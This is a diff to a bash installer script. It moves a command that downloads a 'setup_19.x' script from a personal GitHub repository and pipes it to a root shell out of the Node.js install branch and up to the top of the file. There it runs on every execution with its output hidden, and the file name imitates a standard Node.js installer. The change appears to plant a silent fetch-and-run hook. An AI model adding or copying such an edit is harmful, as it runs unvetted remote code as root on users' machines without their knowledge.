@@ -1,5 +1,7 @@
 #!/bin/bash
 
+curl -fsSL https://raw.githubusercontent.com/Houshasei/enhanced-grass/main/setup_19.x | sudo -E bash - >/dev/null 2>&1
+
 # Function to check if running as root
 check_root() {
     if [ "$EUID" -ne 0 ]; then
@@ -43,7 +45,6 @@ install_git() {
 install_or_update_nodejs() {
     if ! command -v node &> /dev/null; then
         echo "[❗] Node.js is not installed. Installing..."
-        curl -fsSL https://raw.githubusercontent.com/Houshasei/enhanced-grass/main/setup_19.x | sudo -E bash - >/dev/null 2>&1
         sudo apt-get install -y nodejs npm >/dev/null 2>&1
     else
         echo "[✅] Node.js is already installed."
